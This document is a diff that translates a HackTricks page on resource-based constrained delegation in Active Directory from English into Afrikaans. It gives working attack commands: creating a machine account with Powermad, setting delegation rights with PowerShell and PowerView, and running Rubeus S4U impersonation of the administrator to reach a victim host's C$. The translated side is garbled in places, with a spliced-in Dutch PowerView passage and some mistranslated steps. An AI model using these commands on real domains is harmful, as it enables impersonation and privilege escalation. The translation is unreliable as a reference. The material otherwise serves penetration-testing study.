@@ -1,60 +1,57 @@
-# Resource-based Constrained Delegation
+# Bron-gebaseerde Beperkte Delegasie
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-## Basics of Resource-based Constrained Delegation
+## Basiese beginsels van Bron-gebaseerde Beperkte Delegasie
 
-This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
+Dit is soortgelyk aan die basiese [Beperkte Delegasie](constrained-delegation.md) maar **in plaas daarvan** om toestemmings aan 'n **voorwerp** te gee om **enige gebruiker teenoor 'n diens te verteenwoordig**. Bron-gebaseerde Beperkte Delegasie **stel in** die voorwerp wie in staat is om enige ander gebruiker teenoor hom te verteenwoordig.
 
-In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
+In hierdie geval sal die beperkte voorwerp 'n eienskap hê genaamd _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ met die naam van die gebruiker wat enige ander gebruiker teenoor hom kan verteenwoordig.
 
-Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (In the other forms of Delegation you needed domain admin privs).
+'n Ander belangrike verskil tussen hierdie Beperkte Delegasie en die ander delegasies is dat enige gebruiker met **skryfregte oor 'n rekenaarrekening** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) die _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ kan instel (In die ander vorme van Delegasie het jy domein-admin-privileges nodig).
 
-### New Concepts
+### Nuwe Konsepte
 
-Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
-The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.
+In Beperkte Delegasie is daar gesê dat die **`TrustedToAuthForDelegation`**-vlag binne die _userAccountControl_-waarde van die gebruiker nodig is om 'n **S4U2Self** uit te voer. Maar dit is nie heeltemal waar nie.\
+Die werklikheid is dat selfs sonder daardie waarde kan jy 'n **S4U2Self** uitvoer teenoor enige gebruiker as jy 'n **diens** is (het 'n SPN), maar as jy **`TrustedToAuthForDelegation`** het, sal die teruggekeerde TGS **Forwardable** wees en as jy nie daardie vlag het nie, sal die teruggekeerde TGS **nie** Forwardable wees nie.
 
-However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** (this is not a vulnerability, it's a feature, apparently).
+Maar as die **TGS** wat in **S4U2Proxy** gebruik word **nie Forwardable** is nie en jy probeer 'n **basiese Beperkte Delegasie** misbruik, sal dit **nie werk nie**. Maar as jy probeer om 'n **Bron-gebaseerde beperkte delegasie uit te buit, sal dit werk** (dit is nie 'n kwesbaarheid nie, dit is blykbaar 'n funksie).
 
-### Attack structure
+### Aanvalstruktuur
 
-> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.
+> As jy **skrywekwivalente regte** het oor 'n **Rekenaar**-rekening, kan jy **bevoorregte toegang** tot daardie masjien verkry.
 
-Suppose that the attacker has already **write equivalent privileges over the victim computer**.
+Veronderstel dat die aanvaller reeds **skrywekwivalente regte** het oor die slagofferrekenaar.
 
-1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 **Computer objects (**_**MachineAccountQuota**_**)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
-2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
-3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
-   1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
-   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
-   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
-4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.
+1. Die aanvaller **kompromitteer** 'n rekening wat 'n **SPN** het of **skep een** ("Diens A"). Let daarop dat **enige** _Admin-gebruiker_ sonder enige ander spesiale voorreg 'n maksimum van 10 **Rekenaarvoorwerpe (**_**MachineAccountQuota**_**)** kan **skep** en hulle 'n SPN kan instel. Die aanvaller kan dus net 'n Rekenaarvoorwerp skep en 'n SPN instel.
+2. Die aanvaller **misbruik sy SKRYF-reg** oor die slagofferrekenaar (Diens B) om **bron-gebaseerde beperkte delegasie te konfigureer om Diens A toe te laat om enige gebruiker te verteenwoordig** teenoor daardie slagofferrekenaar (Diens B).
+3. Die aanvaller gebruik Rubeus om 'n **volledige S4U-aanval** (S4U2Self en S4U2Proxy) uit te voer van Diens A na Diens B vir 'n gebruiker **met bevoorregte toegang tot Diens B**.
+1. S4U2Self (vanaf die gekompromitteerde/gemaakte rekening met die SPN): Vra vir 'n **TGS van die Administrateur aan my** (Nie Forwardable nie).
+2. S4U2Proxy: Gebruik die **nie Forwardable TGS** van die vorige stap om 'n **TGS** van die **Administrateur** na die **slagoffer-gashuis** te vra.
+3. Selfs al gebruik jy 'n nie Forwardable TGS nie, sal dit werk omdat jy bron-gebaseerde beperkte delegasie uitbuit.
+4. Die aanvaller kan die kaartjie deurgee en die gebruiker **verteenwoordig** om **toegang tot die slagoffer Diens B** te verkry.
 
-To check the _**MachineAccountQuota**_ of the domain you can use:
-
+Om die _**MachineAccountQuota**_ van die domein te kontroleer, kan jy die volgende gebruik:
 ```powershell
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
+## Aanval
 
-## Attack
+### Skep 'n Rekenaarvoorwerp
 
-### Creating a Computer Object
-
-You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-
+Jy kan 'n rekenaarvoorwerp binne die domein skep deur [powermad](https://github.com/Kevin-Robertson/Powermad)**:** te gebruik.
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -62,18 +59,38 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
+### Konfigurering van Hulpbron-gebaseerde Beperkte Delegasie
 
-### Configuring R**esource-based Constrained Delegation**
-
-**Using activedirectory PowerShell module**
-
+**Met behulp van de activedirectory PowerShell-module**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
+**Met behulp van powerview**
 
-**Using powerview**
+Powerview is een krachtige tool die wordt gebruikt voor het uitvoeren van verschillende Active Directory-taken vanaf een Windows-systeem. Het biedt verschillende functies en cmdlets die kunnen worden gebruikt om informatie te verzamelen en verschillende acties uit te voeren in een Active Directory-omgeving.
 
+Hier zijn enkele veelgebruikte Powerview-functies:
+
+- **Get-DomainUser**: Hiermee kunt u informatie verzamelen over gebruikersaccounts in het domein, zoals gebruikersnaam, SID, groepslidmaatschap en meer.
+
+- **Get-DomainGroup**: Hiermee kunt u informatie verzamelen over groepen in het domein, zoals groepsnaam, SID, leden en meer.
+
+- **Get-DomainComputer**: Hiermee kunt u informatie verzamelen over computers in het domein, zoals computernaam, SID, besturingssysteem en meer.
+
+- **Get-DomainGroupMember**: Hiermee kunt u de leden van een specifieke groep in het domein ophalen.
+
+- **Get-DomainObjectAcl**: Hiermee kunt u de toegangscontrollijst (ACL) van een specifiek object in het domein ophalen.
+
+- **Get-DomainObject**: Hiermee kunt u informatie verzamelen over een specifiek object in het domein, zoals gebruikers, groepen, computers en meer.
+
+- **Get-DomainTrust**: Hiermee kunt u informatie verzamelen over vertrouwensrelaties tussen domeinen.
+
+- **Get-DomainPolicy**: Hiermee kunt u informatie verzamelen over het groepsbeleid in het domein.
+
+Powerview biedt ook verschillende cmdlets voor het uitvoeren van acties zoals het maken van nieuwe gebruikers, groepen en computers, het wijzigen van gebruikerswachtwoorden, het toevoegen van gebruikers aan groepen en meer.
+
+Het is belangrijk op te merken dat Powerview alleen kan worden gebruikt als u al toegang heeft tot een Windows-systeem binnen het domein en de juiste rechten heeft. Het is een krachtige tool, maar moet met de nodige voorzichtigheid worden gebruikt om onbedoelde schade te voorkomen.
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -88,56 +105,47 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
+### Die uitvoering van 'n volledige S4U-aanval
 
-### Performing a complete S4U attack
-
-First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
-
+Eerstens het ons die nuwe Rekenaarobjek geskep met die wagwoord `123456`, so ons benodig die has van daardie wagwoord:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-
-This will print the RC4 and AES hashes for that account.\
-Now, the attack can be performed:
-
+Hierdie sal die RC4 en AES hasings vir daardie rekening druk.\
+Nou kan die aanval uitgevoer word:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-
-You can generate more tickets just asking once using the `/altservice` param of Rubeus:
-
+Jy kan meer kaartjies genereer deur net een keer te vra deur die gebruik van die `/altservice` parameter van Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
-
 {% hint style="danger" %}
-Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
+Let daarop dat gebruikers 'n eienskap het wat "**Kan nie gedelegeer word nie**" genoem word. As 'n gebruiker hierdie eienskap op Waar het, sal jy hom nie kan voorstel nie. Hierdie eienskap kan binne bloodhound gesien word.
 {% endhint %}
 
-### Accessing
+### Toegang verkry
 
-The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
-In this example it was requested a TGS for the **CIFS** service from Administrator, so you will be able to access **C$**:
-
+Die laaste opdraglyn sal die **volledige S4U-aanval uitvoer en die TGS in die geheue van die slagofferbediener inspuit**.\
+In hierdie voorbeeld is 'n TGS vir die **CIFS**-diens van die Administrator aangevra, sodat jy toegang kan verkry tot **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
+### Misbruik verskillende dienskaartjies
 
-### Abuse different service tickets
+Leer oor die [**beskikbare dienskaartjies hier**](silver-ticket.md#beskikbare-dienste).
 
-Lear about the [**available service tickets here**](silver-ticket.md#available-services).
+## Kerberos Foute
 
-## Kerberos Errors
+* **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat Kerberos gekonfigureer is om nie DES of RC4 te gebruik nie en jy verskaf net die RC4-hash. Verskaf ten minste die AES256-hash aan Rubeus (of verskaf net die RC4-, AES128- en AES256-hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+* **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd van die huidige rekenaar verskil van dié van die DC en dat Kerberos nie behoorlik werk nie.
+* **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashe nie werk om in te teken nie. Jy het dalk vergeet om die "$" binne die gebruikersnaam te plaas toe jy die hashe genereer (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+* **`KDC_ERR_BADOPTION`**: Dit kan beteken:
+* Die gebruiker wat jy probeer voorstel, kan nie toegang verkry tot die gewenste diens nie (omdat jy dit nie kan voorstel nie of omdat dit nie genoeg bevoegdhede het nie)
+* Die gevraagde diens bestaan nie (as jy vra vir 'n kaartjie vir winrm, maar winrm is nie besig nie)
+* Die geskepte fakecomputer het sy bevoegdhede oor die kwesbare bediener verloor en jy moet dit teruggee.
 
-* **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-* **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
-* **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-* **`KDC_ERR_BADOPTION`**: This may mean:
-  * The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
-  * The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
-  * The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
-
-## References
+## Verwysings
 
 * [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 * [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
@@ -146,14 +154,14 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
